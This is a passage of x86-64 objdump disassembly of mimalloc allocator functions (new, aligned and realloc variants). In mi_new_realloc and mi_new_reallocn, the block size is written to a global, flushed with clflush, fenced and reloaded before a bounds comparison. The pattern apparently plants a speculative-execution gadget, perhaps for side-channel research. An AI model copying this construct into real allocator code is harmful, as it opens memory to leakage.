  403665:	48 85 c0             	test   %rax,%rax
  403668:	74 06                	je     403670 <mi_heap_alloc_new_n+0x90>
  40366a:	ff d0                	callq  *%rax
  40366c:	31 c0                	xor    %eax,%eax
  40366e:	eb bb                	jmp    40362b <mi_heap_alloc_new_n+0x4b>
  403670:	48 8d 35 1b 83 01 00 	lea    0x1831b(%rip),%rsi        # 41b992 <__PRETTY_FUNCTION__.26319+0x12>
  403677:	bf 0c 00 00 00       	mov    $0xc,%edi
  40367c:	e8 ff 60 00 00       	callq  409780 <_mi_error_message>
  403681:	e8 2a d7 ff ff       	callq  400db0 <abort@plt>
  403686:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40368d:	00 00 00 

0000000000403690 <mi_new_n>:
  403690:	55                   	push   %rbp
  403691:	53                   	push   %rbx
  403692:	48 89 f3             	mov    %rsi,%rbx
  403695:	48 83 ec 08          	sub    $0x8,%rsp
  403699:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  4036a0:	64 48 8b 28          	mov    %fs:(%rax),%rbp
  4036a4:	48 83 ff 01          	cmp    $0x1,%rdi
  4036a8:	74 0b                	je     4036b5 <mi_new_n+0x25>
  4036aa:	48 89 f8             	mov    %rdi,%rax
  4036ad:	48 f7 e6             	mul    %rsi
  4036b0:	48 89 c3             	mov    %rax,%rbx
  4036b3:	70 6b                	jo     403720 <mi_new_n+0x90>
  4036b5:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
  4036bc:	77 32                	ja     4036f0 <mi_new_n+0x60>
  4036be:	48 8d 43 07          	lea    0x7(%rbx),%rax
  4036c2:	48 c1 e8 03          	shr    $0x3,%rax
  4036c6:	48 8b 94 c5 f8 00 00 	mov    0xf8(%rbp,%rax,8),%rdx
  4036cd:	00 
  4036ce:	48 8b 42 10          	mov    0x10(%rdx),%rax
  4036d2:	48 85 c0             	test   %rax,%rax
  4036d5:	74 19                	je     4036f0 <mi_new_n+0x60>
  4036d7:	48 8b 08             	mov    (%rax),%rcx
  4036da:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  4036df:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  4036e3:	48 83 c4 08          	add    $0x8,%rsp
  4036e7:	5b                   	pop    %rbx
  4036e8:	5d                   	pop    %rbp
  4036e9:	c3                   	retq   
  4036ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4036f0:	31 c9                	xor    %ecx,%ecx
  4036f2:	31 d2                	xor    %edx,%edx
  4036f4:	48 89 de             	mov    %rbx,%rsi
  4036f7:	48 89 ef             	mov    %rbp,%rdi
  4036fa:	e8 71 ba 00 00       	callq  40f170 <_mi_malloc_generic>
  4036ff:	48 85 c0             	test   %rax,%rax
  403702:	75 df                	jne    4036e3 <mi_new_n+0x53>
  403704:	48 83 c4 08          	add    $0x8,%rsp
  403708:	48 89 de             	mov    %rbx,%rsi
  40370b:	48 89 ef             	mov    %rbp,%rdi
  40370e:	31 d2                	xor    %edx,%edx
  403710:	5b                   	pop    %rbx
  403711:	5d                   	pop    %rbp
  403712:	e9 d9 fc ff ff       	jmpq   4033f0 <mi_heap_try_new>
  403717:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40371e:	00 00 
  403720:	e8 bb fc ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
  403725:	48 85 c0             	test   %rax,%rax
  403728:	74 06                	je     403730 <mi_new_n+0xa0>
  40372a:	ff d0                	callq  *%rax
  40372c:	31 c0                	xor    %eax,%eax
  40372e:	eb b3                	jmp    4036e3 <mi_new_n+0x53>
  403730:	48 8d 35 5b 82 01 00 	lea    0x1825b(%rip),%rsi        # 41b992 <__PRETTY_FUNCTION__.26319+0x12>
  403737:	bf 0c 00 00 00       	mov    $0xc,%edi
  40373c:	e8 3f 60 00 00       	callq  409780 <_mi_error_message>
  403741:	e8 6a d6 ff ff       	callq  400db0 <abort@plt>
  403746:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40374d:	00 00 00 

0000000000403750 <mi_new_nothrow>:
  403750:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  403757:	53                   	push   %rbx
  403758:	48 89 fb             	mov    %rdi,%rbx
  40375b:	64 48 8b 38          	mov    %fs:(%rax),%rdi
  40375f:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
  403766:	77 28                	ja     403790 <mi_new_nothrow+0x40>
  403768:	48 8d 43 07          	lea    0x7(%rbx),%rax
  40376c:	48 c1 e8 03          	shr    $0x3,%rax
  403770:	48 8b 94 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rdx
  403777:	00 
  403778:	48 8b 42 10          	mov    0x10(%rdx),%rax
  40377c:	48 85 c0             	test   %rax,%rax
  40377f:	74 0f                	je     403790 <mi_new_nothrow+0x40>
  403781:	48 8b 08             	mov    (%rax),%rcx
  403784:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  403789:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  40378d:	5b                   	pop    %rbx
  40378e:	c3                   	retq   
  40378f:	90                   	nop
  403790:	31 c9                	xor    %ecx,%ecx
  403792:	31 d2                	xor    %edx,%edx
  403794:	48 89 de             	mov    %rbx,%rsi
  403797:	e8 d4 b9 00 00       	callq  40f170 <_mi_malloc_generic>
  40379c:	48 85 c0             	test   %rax,%rax
  40379f:	75 ec                	jne    40378d <mi_new_nothrow+0x3d>
  4037a1:	48 89 df             	mov    %rbx,%rdi
  4037a4:	5b                   	pop    %rbx
  4037a5:	e9 26 fd ff ff       	jmpq   4034d0 <mi_try_new.constprop.16>
  4037aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000004037b0 <mi_new_aligned>:
  4037b0:	55                   	push   %rbp
  4037b1:	48 89 fd             	mov    %rdi,%rbp
  4037b4:	53                   	push   %rbx
  4037b5:	48 89 f3             	mov    %rsi,%rbx
  4037b8:	48 83 ec 08          	sub    $0x8,%rsp
  4037bc:	eb 04                	jmp    4037c2 <mi_new_aligned+0x12>
  4037be:	66 90                	xchg   %ax,%ax
  4037c0:	ff d0                	callq  *%rax
  4037c2:	48 89 de             	mov    %rbx,%rsi
  4037c5:	48 89 ef             	mov    %rbp,%rdi
  4037c8:	e8 b3 0a 00 00       	callq  404280 <mi_malloc_aligned>
  4037cd:	48 85 c0             	test   %rax,%rax
  4037d0:	75 26                	jne    4037f8 <mi_new_aligned+0x48>
  4037d2:	e8 09 fc ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
  4037d7:	48 85 c0             	test   %rax,%rax
  4037da:	75 e4                	jne    4037c0 <mi_new_aligned+0x10>
  4037dc:	48 8d 35 af 81 01 00 	lea    0x181af(%rip),%rsi        # 41b992 <__PRETTY_FUNCTION__.26319+0x12>
  4037e3:	bf 0c 00 00 00       	mov    $0xc,%edi
  4037e8:	e8 93 5f 00 00       	callq  409780 <_mi_error_message>
  4037ed:	e8 be d5 ff ff       	callq  400db0 <abort@plt>
  4037f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4037f8:	48 83 c4 08          	add    $0x8,%rsp
  4037fc:	5b                   	pop    %rbx
  4037fd:	5d                   	pop    %rbp
  4037fe:	c3                   	retq   
  4037ff:	90                   	nop

0000000000403800 <mi_new_aligned_nothrow>:
  403800:	41 54                	push   %r12
  403802:	49 89 fc             	mov    %rdi,%r12
  403805:	55                   	push   %rbp
  403806:	48 89 f5             	mov    %rsi,%rbp
  403809:	53                   	push   %rbx
  40380a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403810:	48 89 ee             	mov    %rbp,%rsi
  403813:	4c 89 e7             	mov    %r12,%rdi
  403816:	e8 65 0a 00 00       	callq  404280 <mi_malloc_aligned>
  40381b:	48 89 c3             	mov    %rax,%rbx
  40381e:	48 85 c0             	test   %rax,%rax
  403821:	75 26                	jne    403849 <mi_new_aligned_nothrow+0x49>
  403823:	e8 b8 fb ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
  403828:	48 85 c0             	test   %rax,%rax
  40382b:	74 0b                	je     403838 <mi_new_aligned_nothrow+0x38>
  40382d:	ff d0                	callq  *%rax
  40382f:	eb df                	jmp    403810 <mi_new_aligned_nothrow+0x10>
  403831:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403838:	48 8d 35 53 81 01 00 	lea    0x18153(%rip),%rsi        # 41b992 <__PRETTY_FUNCTION__.26319+0x12>
  40383f:	bf 0c 00 00 00       	mov    $0xc,%edi
  403844:	e8 37 5f 00 00       	callq  409780 <_mi_error_message>
  403849:	48 89 d8             	mov    %rbx,%rax
  40384c:	5b                   	pop    %rbx
  40384d:	5d                   	pop    %rbp
  40384e:	41 5c                	pop    %r12
  403850:	c3                   	retq   
  403851:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  403858:	00 00 00 00 
  40385c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000403860 <mi_new_realloc>:
  403860:	41 57                	push   %r15
  403862:	48 89 f8             	mov    %rdi,%rax
  403865:	41 56                	push   %r14
  403867:	49 89 f6             	mov    %rsi,%r14
  40386a:	41 55                	push   %r13
  40386c:	4c 8d 6e 07          	lea    0x7(%rsi),%r13
  403870:	41 54                	push   %r12
  403872:	49 c1 ed 03          	shr    $0x3,%r13
  403876:	55                   	push   %rbp
  403877:	48 8d 6f ff          	lea    -0x1(%rdi),%rbp
  40387b:	48 81 e5 00 00 00 fe 	and    $0xfffffffffe000000,%rbp
  403882:	53                   	push   %rbx
  403883:	48 89 fb             	mov    %rdi,%rbx
  403886:	48 29 e8             	sub    %rbp,%rax
  403889:	48 c1 e8 10          	shr    $0x10,%rax
  40388d:	4c 8d 24 40          	lea    (%rax,%rax,2),%r12
  403891:	48 83 ec 18          	sub    $0x18,%rsp
  403895:	49 c1 e4 05          	shl    $0x5,%r12
  403899:	49 8d 84 24 20 01 00 	lea    0x120(%r12),%rax
  4038a0:	00 
  4038a1:	49 01 ec             	add    %rbp,%r12
  4038a4:	48 89 04 24          	mov    %rax,(%rsp)
  4038a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4038af:	00 
  4038b0:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  4038b7:	45 31 c9             	xor    %r9d,%r9d
  4038ba:	64 4c 8b 10          	mov    %fs:(%rax),%r10
  4038be:	48 85 ed             	test   %rbp,%rbp
  4038c1:	7e 20                	jle    4038e3 <mi_new_realloc+0x83>
  4038c3:	41 8b 84 24 24 01 00 	mov    0x124(%r12),%eax
  4038ca:	00 
  4038cb:	48 8b 3c 24          	mov    (%rsp),%rdi
  4038cf:	48 29 c7             	sub    %rax,%rdi
  4038d2:	48 01 ef             	add    %rbp,%rdi
  4038d5:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  4038d9:	0f 85 19 01 00 00    	jne    4039f8 <mi_new_realloc+0x198>
  4038df:	4c 8b 4f 28          	mov    0x28(%rdi),%r9
  4038e3:	4c 89 0d 9e 4e 22 00 	mov    %r9,0x224e9e(%rip)        # 628788 <size_realloc>
  4038ea:	0f ae 3d 97 4e 22 00 	clflush 0x224e97(%rip)        # 628788 <size_realloc>
  4038f1:	0f ae f0             	mfence 
  4038f4:	0f ae e8             	lfence 
  4038f7:	48 8b 05 8a 4e 22 00 	mov    0x224e8a(%rip),%rax        # 628788 <size_realloc>
  4038fe:	49 39 c6             	cmp    %rax,%r14
  403901:	0f 86 c9 00 00 00    	jbe    4039d0 <mi_new_realloc+0x170>
  403907:	49 81 fe 00 04 00 00 	cmp    $0x400,%r14
  40390e:	77 60                	ja     403970 <mi_new_realloc+0x110>
  403910:	4b 8b 84 ea f8 00 00 	mov    0xf8(%r10,%r13,8),%rax
  403917:	00 
  403918:	4c 8b 78 10          	mov    0x10(%rax),%r15
  40391c:	4d 85 ff             	test   %r15,%r15
  40391f:	74 4f                	je     403970 <mi_new_realloc+0x110>
  403921:	49 8b 17             	mov    (%r15),%rdx
  403924:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  403929:	48 89 50 10          	mov    %rdx,0x10(%rax)
  40392d:	4d 85 f6             	test   %r14,%r14
  403930:	75 04                	jne    403936 <mi_new_realloc+0xd6>
  403932:	41 c6 07 00          	movb   $0x0,(%r15)
  403936:	48 85 db             	test   %rbx,%rbx
  403939:	74 1d                	je     403958 <mi_new_realloc+0xf8>
  40393b:	4d 39 ce             	cmp    %r9,%r14
  40393e:	4c 89 ca             	mov    %r9,%rdx
  403941:	4c 89 ff             	mov    %r15,%rdi
  403944:	48 89 de             	mov    %rbx,%rsi
  403947:	49 0f 46 d6          	cmovbe %r14,%rdx
  40394b:	e8 50 d5 ff ff       	callq  400ea0 <memcpy@plt>
  403950:	48 89 df             	mov    %rbx,%rdi
  403953:	e8 08 e3 ff ff       	callq  401c60 <mi_free>
  403958:	48 83 c4 18          	add    $0x18,%rsp
  40395c:	4c 89 f8             	mov    %r15,%rax
  40395f:	5b                   	pop    %rbx
  403960:	5d                   	pop    %rbp
  403961:	41 5c                	pop    %r12
  403963:	41 5d                	pop    %r13
  403965:	41 5e                	pop    %r14
  403967:	41 5f                	pop    %r15
  403969:	c3                   	retq   
  40396a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403970:	31 c9                	xor    %ecx,%ecx
  403972:	31 d2                	xor    %edx,%edx
  403974:	4c 89 f6             	mov    %r14,%rsi
  403977:	4c 89 d7             	mov    %r10,%rdi
  40397a:	4c 89 4c 24 08       	mov    %r9,0x8(%rsp)
  40397f:	e8 ec b7 00 00       	callq  40f170 <_mi_malloc_generic>
  403984:	4c 8b 4c 24 08       	mov    0x8(%rsp),%r9
  403989:	49 89 c7             	mov    %rax,%r15
  40398c:	48 85 c0             	test   %rax,%rax
  40398f:	75 9c                	jne    40392d <mi_new_realloc+0xcd>
  403991:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403998:	e8 43 fa ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
  40399d:	48 85 c0             	test   %rax,%rax
  4039a0:	74 0e                	je     4039b0 <mi_new_realloc+0x150>
  4039a2:	ff d0                	callq  *%rax
  4039a4:	e9 07 ff ff ff       	jmpq   4038b0 <mi_new_realloc+0x50>
  4039a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4039b0:	48 8d 35 db 7f 01 00 	lea    0x17fdb(%rip),%rsi        # 41b992 <__PRETTY_FUNCTION__.26319+0x12>
  4039b7:	bf 0c 00 00 00       	mov    $0xc,%edi
  4039bc:	31 c0                	xor    %eax,%eax
  4039be:	e8 bd 5d 00 00       	callq  409780 <_mi_error_message>
  4039c3:	e8 e8 d3 ff ff       	callq  400db0 <abort@plt>
  4039c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4039cf:	00 
  4039d0:	48 d1 e8             	shr    %rax
  4039d3:	49 39 c6             	cmp    %rax,%r14
  4039d6:	0f 82 2b ff ff ff    	jb     403907 <mi_new_realloc+0xa7>
  4039dc:	4d 85 f6             	test   %r14,%r14
  4039df:	0f 84 22 ff ff ff    	je     403907 <mi_new_realloc+0xa7>
  4039e5:	48 85 db             	test   %rbx,%rbx
  4039e8:	74 ae                	je     403998 <mi_new_realloc+0x138>
  4039ea:	49 89 df             	mov    %rbx,%r15
  4039ed:	e9 66 ff ff ff       	jmpq   403958 <mi_new_realloc+0xf8>
  4039f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4039f8:	48 89 de             	mov    %rbx,%rsi
  4039fb:	e8 f0 e0 ff ff       	callq  401af0 <mi_page_usable_aligned_size_of>
  403a00:	49 89 c1             	mov    %rax,%r9
  403a03:	e9 db fe ff ff       	jmpq   4038e3 <mi_new_realloc+0x83>
  403a08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  403a0f:	00 

0000000000403a10 <mi_new_reallocn>:
  403a10:	41 57                	push   %r15
  403a12:	41 56                	push   %r14
  403a14:	41 55                	push   %r13
  403a16:	49 89 d5             	mov    %rdx,%r13
  403a19:	41 54                	push   %r12
  403a1b:	55                   	push   %rbp
  403a1c:	53                   	push   %rbx
  403a1d:	48 89 fb             	mov    %rdi,%rbx
  403a20:	48 83 ec 18          	sub    $0x18,%rsp
  403a24:	48 83 fe 01          	cmp    $0x1,%rsi
  403a28:	74 0f                	je     403a39 <mi_new_reallocn+0x29>
  403a2a:	48 89 f0             	mov    %rsi,%rax
  403a2d:	49 f7 e5             	mul    %r13
  403a30:	49 89 c5             	mov    %rax,%r13
  403a33:	0f 80 97 01 00 00    	jo     403bd0 <mi_new_reallocn+0x1c0>
  403a39:	48 8d 6b ff          	lea    -0x1(%rbx),%rbp
  403a3d:	48 89 d8             	mov    %rbx,%rax
  403a40:	48 81 e5 00 00 00 fe 	and    $0xfffffffffe000000,%rbp
  403a47:	48 29 e8             	sub    %rbp,%rax
  403a4a:	48 c1 e8 10          	shr    $0x10,%rax
  403a4e:	4c 8d 24 40          	lea    (%rax,%rax,2),%r12
  403a52:	49 c1 e4 05          	shl    $0x5,%r12
  403a56:	49 8d 84 24 20 01 00 	lea    0x120(%r12),%rax
  403a5d:	00 
  403a5e:	49 01 ec             	add    %rbp,%r12
  403a61:	48 89 04 24          	mov    %rax,(%rsp)
  403a65:	49 8d 45 07          	lea    0x7(%r13),%rax
  403a69:	48 c1 e8 03          	shr    $0x3,%rax
  403a6d:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  403a72:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403a78:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  403a7f:	45 31 ff             	xor    %r15d,%r15d
  403a82:	64 4c 8b 10          	mov    %fs:(%rax),%r10
  403a86:	48 85 ed             	test   %rbp,%rbp
  403a89:	7e 20                	jle    403aab <mi_new_reallocn+0x9b>
  403a8b:	41 8b 84 24 24 01 00 	mov    0x124(%r12),%eax
  403a92:	00 
  403a93:	48 8b 3c 24          	mov    (%rsp),%rdi
  403a97:	48 29 c7             	sub    %rax,%rdi
  403a9a:	48 01 ef             	add    %rbp,%rdi
  403a9d:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  403aa1:	0f 85 11 01 00 00    	jne    403bb8 <mi_new_reallocn+0x1a8>
  403aa7:	4c 8b 7f 28          	mov    0x28(%rdi),%r15
  403aab:	4c 89 3d d6 4c 22 00 	mov    %r15,0x224cd6(%rip)        # 628788 <size_realloc>
  403ab2:	0f ae 3d cf 4c 22 00 	clflush 0x224ccf(%rip)        # 628788 <size_realloc>
  403ab9:	0f ae f0             	mfence 
  403abc:	0f ae e8             	lfence 
  403abf:	48 8b 05 c2 4c 22 00 	mov    0x224cc2(%rip),%rax        # 628788 <size_realloc>
  403ac6:	4c 39 e8             	cmp    %r13,%rax
  403ac9:	0f 83 c1 00 00 00    	jae    403b90 <mi_new_reallocn+0x180>
  403acf:	49 81 fd 00 04 00 00 	cmp    $0x400,%r13
  403ad6:	77 68                	ja     403b40 <mi_new_reallocn+0x130>
  403ad8:	48 8b 44 24 08       	mov    0x8(%rsp),%rax
  403add:	49 8b 84 c2 f8 00 00 	mov    0xf8(%r10,%rax,8),%rax
  403ae4:	00 
  403ae5:	4c 8b 70 10          	mov    0x10(%rax),%r14
  403ae9:	4d 85 f6             	test   %r14,%r14
  403aec:	74 52                	je     403b40 <mi_new_reallocn+0x130>
  403aee:	49 8b 16             	mov    (%r14),%rdx
  403af1:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  403af6:	48 89 50 10          	mov    %rdx,0x10(%rax)
  403afa:	4d 85 ed             	test   %r13,%r13
  403afd:	75 04                	jne    403b03 <mi_new_reallocn+0xf3>
  403aff:	41 c6 06 00          	movb   $0x0,(%r14)
  403b03:	48 85 db             	test   %rbx,%rbx
  403b06:	74 1d                	je     403b25 <mi_new_reallocn+0x115>
  403b08:	4d 39 fd             	cmp    %r15,%r13
  403b0b:	4c 89 fa             	mov    %r15,%rdx
  403b0e:	4c 89 f7             	mov    %r14,%rdi
  403b11:	48 89 de             	mov    %rbx,%rsi
  403b14:	49 0f 46 d5          	cmovbe %r13,%rdx
  403b18:	e8 83 d3 ff ff       	callq  400ea0 <memcpy@plt>
  403b1d:	48 89 df             	mov    %rbx,%rdi
  403b20:	e8 3b e1 ff ff       	callq  401c60 <mi_free>
  403b25:	48 83 c4 18          	add    $0x18,%rsp
  403b29:	4c 89 f0             	mov    %r14,%rax
  403b2c:	5b                   	pop    %rbx
  403b2d:	5d                   	pop    %rbp
  403b2e:	41 5c                	pop    %r12
  403b30:	41 5d                	pop    %r13
  403b32:	41 5e                	pop    %r14
  403b34:	41 5f                	pop    %r15
  403b36:	c3                   	retq   
  403b37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  403b3e:	00 00 
  403b40:	31 c9                	xor    %ecx,%ecx
  403b42:	31 d2                	xor    %edx,%edx
  403b44:	4c 89 ee             	mov    %r13,%rsi
  403b47:	4c 89 d7             	mov    %r10,%rdi
  403b4a:	e8 21 b6 00 00       	callq  40f170 <_mi_malloc_generic>
  403b4f:	49 89 c6             	mov    %rax,%r14
  403b52:	48 85 c0             	test   %rax,%rax
  403b55:	75 a3                	jne    403afa <mi_new_reallocn+0xea>
  403b57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  403b5e:	00 00 
  403b60:	e8 7b f8 ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
  403b65:	48 85 c0             	test   %rax,%rax
  403b68:	74 0e                	je     403b78 <mi_new_reallocn+0x168>
  403b6a:	ff d0                	callq  *%rax
  403b6c:	e9 07 ff ff ff       	jmpq   403a78 <mi_new_reallocn+0x68>
  403b71:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403b78:	48 8d 35 13 7e 01 00 	lea    0x17e13(%rip),%rsi        # 41b992 <__PRETTY_FUNCTION__.26319+0x12>
  403b7f:	bf 0c 00 00 00       	mov    $0xc,%edi
  403b84:	31 c0                	xor    %eax,%eax
  403b86:	e8 f5 5b 00 00       	callq  409780 <_mi_error_message>
  403b8b:	e8 20 d2 ff ff       	callq  400db0 <abort@plt>
  403b90:	48 d1 e8             	shr    %rax
  403b93:	4c 39 e8             	cmp    %r13,%rax
  403b96:	0f 87 33 ff ff ff    	ja     403acf <mi_new_reallocn+0xbf>
  403b9c:	4d 85 ed             	test   %r13,%r13
  403b9f:	0f 84 2a ff ff ff    	je     403acf <mi_new_reallocn+0xbf>
  403ba5:	48 85 db             	test   %rbx,%rbx
  403ba8:	74 b6                	je     403b60 <mi_new_reallocn+0x150>
  403baa:	49 89 de             	mov    %rbx,%r14
  403bad:	e9 73 ff ff ff       	jmpq   403b25 <mi_new_reallocn+0x115>
  403bb2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403bb8:	48 89 de             	mov    %rbx,%rsi
  403bbb:	e8 30 df ff ff       	callq  401af0 <mi_page_usable_aligned_size_of>
  403bc0:	49 89 c7             	mov    %rax,%r15
  403bc3:	e9 e3 fe ff ff       	jmpq   403aab <mi_new_reallocn+0x9b>
  403bc8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  403bcf:	00 
  403bd0:	e8 0b f8 ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
  403bd5:	48 85 c0             	test   %rax,%rax
  403bd8:	74 9e                	je     403b78 <mi_new_reallocn+0x168>
  403bda:	ff d0                	callq  *%rax
  403bdc:	45 31 f6             	xor    %r14d,%r14d
  403bdf:	e9 41 ff ff ff       	jmpq   403b25 <mi_new_reallocn+0x115>
  403be4:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  403beb:	00 00 00 
  403bee:	66 90                	xchg   %ax,%ax

0000000000403bf0 <mi_heap_malloc_zero_aligned_at_overalloc>:
  403bf0:	41 56                	push   %r14
  403bf2:	49 89 f6             	mov    %rsi,%r14
  403bf5:	41 55                	push   %r13
  403bf7:	49 89 d5             	mov    %rdx,%r13
  403bfa:	41 54                	push   %r12
  403bfc:	49 89 cc             	mov    %rcx,%r12
  403bff:	55                   	push   %rbp
  403c00:	44 89 c5             	mov    %r8d,%ebp
  403c03:	53                   	push   %rbx
  403c04:	48 81 fa 00 00 00 01 	cmp    $0x1000000,%rdx
  403c0b:	0f 87 d7 00 00 00    	ja     403ce8 <mi_heap_malloc_zero_aligned_at_overalloc+0xf8>
  403c11:	48 83 fe 10          	cmp    $0x10,%rsi
  403c15:	b8 10 00 00 00       	mov    $0x10,%eax
  403c1a:	41 0f b6 d0          	movzbl %r8b,%edx
  403c1e:	48 0f 43 c6          	cmovae %rsi,%rax
  403c22:	49 8d 74 05 ff       	lea    -0x1(%r13,%rax,1),%rsi
  403c27:	e8 e4 e6 ff ff       	callq  402310 <_mi_heap_malloc_zero>
  403c2c:	48 89 c3             	mov    %rax,%rbx
  403c2f:	48 85 c0             	test   %rax,%rax
  403c32:	0f 84 e0 00 00 00    	je     403d18 <mi_heap_malloc_zero_aligned_at_overalloc+0x128>
  403c38:	48 8d 7b ff          	lea    -0x1(%rbx),%rdi
  403c3c:	b8 00 00 00 00       	mov    $0x0,%eax
  403c41:	4a 8d 0c 23          	lea    (%rbx,%r12,1),%rcx
  403c45:	48 81 e7 00 00 00 fe 	and    $0xfffffffffe000000,%rdi
  403c4c:	48 0f 4e f8          	cmovle %rax,%rdi
  403c50:	49 8d 45 ff          	lea    -0x1(%r13),%rax
  403c54:	48 21 c1             	and    %rax,%rcx
  403c57:	74 47                	je     403ca0 <mi_heap_malloc_zero_aligned_at_overalloc+0xb0>
  403c59:	4c 89 ea             	mov    %r13,%rdx
  403c5c:	48 29 ca             	sub    %rcx,%rdx
  403c5f:	4c 8d 24 13          	lea    (%rbx,%rdx,1),%r12
  403c63:	4c 39 e3             	cmp    %r12,%rbx
  403c66:	74 38                	je     403ca0 <mi_heap_malloc_zero_aligned_at_overalloc+0xb0>
  403c68:	48 89 d8             	mov    %rbx,%rax
  403c6b:	48 89 de             	mov    %rbx,%rsi
  403c6e:	4c 01 f2             	add    %r14,%rdx
  403c71:	4c 89 e3             	mov    %r12,%rbx
  403c74:	48 29 f8             	sub    %rdi,%rax
  403c77:	48 c1 e8 10          	shr    $0x10,%rax
  403c7b:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  403c7f:	48 c1 e0 05          	shl    $0x5,%rax
  403c83:	48 8d 88 20 01 00 00 	lea    0x120(%rax),%rcx
  403c8a:	8b 84 07 24 01 00 00 	mov    0x124(%rdi,%rax,1),%eax
  403c91:	48 29 c1             	sub    %rax,%rcx
  403c94:	48 01 cf             	add    %rcx,%rdi
  403c97:	80 4f 0e 02          	orb    $0x2,0xe(%rdi)
  403c9b:	e8 60 e4 ff ff       	callq  402100 <_mi_padding_shrink>
  403ca0:	49 81 fd 00 00 00 01 	cmp    $0x1000000,%r13
  403ca7:	76 05                	jbe    403cae <mi_heap_malloc_zero_aligned_at_overalloc+0xbe>
  403ca9:	40 84 ed             	test   %bpl,%bpl
  403cac:	75 12                	jne    403cc0 <mi_heap_malloc_zero_aligned_at_overalloc+0xd0>
  403cae:	48 89 d8             	mov    %rbx,%rax
  403cb1:	5b                   	pop    %rbx
  403cb2:	5d                   	pop    %rbp
  403cb3:	41 5c                	pop    %r12
  403cb5:	41 5d                	pop    %r13
  403cb7:	41 5e                	pop    %r14
  403cb9:	c3                   	retq   
  403cba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403cc0:	48 89 df             	mov    %rbx,%rdi
  403cc3:	e8 f8 e1 ff ff       	callq  401ec0 <mi_usable_size>
  403cc8:	48 89 df             	mov    %rbx,%rdi
  403ccb:	31 f6                	xor    %esi,%esi
  403ccd:	48 89 c2             	mov    %rax,%rdx
  403cd0:	e8 8b d1 ff ff       	callq  400e60 <memset@plt>
  403cd5:	48 89 d8             	mov    %rbx,%rax
  403cd8:	5b                   	pop    %rbx
  403cd9:	5d                   	pop    %rbp
  403cda:	41 5c                	pop    %r12
  403cdc:	41 5d                	pop    %r13
  403cde:	41 5e                	pop    %r14
  403ce0:	c3                   	retq   
  403ce1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403ce8:	48 85 c9             	test   %rcx,%rcx
  403ceb:	75 2b                	jne    403d18 <mi_heap_malloc_zero_aligned_at_overalloc+0x128>
  403ced:	48 81 fe 01 04 00 00 	cmp    $0x401,%rsi
  403cf4:	be 01 04 00 00       	mov    $0x401,%esi
  403cf9:	48 89 d1             	mov    %rdx,%rcx
  403cfc:	49 0f 43 f6          	cmovae %r14,%rsi
  403d00:	31 d2                	xor    %edx,%edx
  403d02:	e8 89 e5 ff ff       	callq  402290 <_mi_heap_malloc_zero_ex>
  403d07:	48 89 c3             	mov    %rax,%rbx
  403d0a:	48 85 c0             	test   %rax,%rax
  403d0d:	0f 85 25 ff ff ff    	jne    403c38 <mi_heap_malloc_zero_aligned_at_overalloc+0x48>
  403d13:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403d18:	31 db                	xor    %ebx,%ebx
  403d1a:	eb 92                	jmp    403cae <mi_heap_malloc_zero_aligned_at_overalloc+0xbe>
  403d1c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000403d20 <mi_heap_malloc_zero_aligned_at_generic>:
  403d20:	48 b8 00 00 fe ff ff 	movabs $0xfffffffe0000,%rax
  403d27:	ff 00 00 
  403d2a:	48 39 c6             	cmp    %rax,%rsi
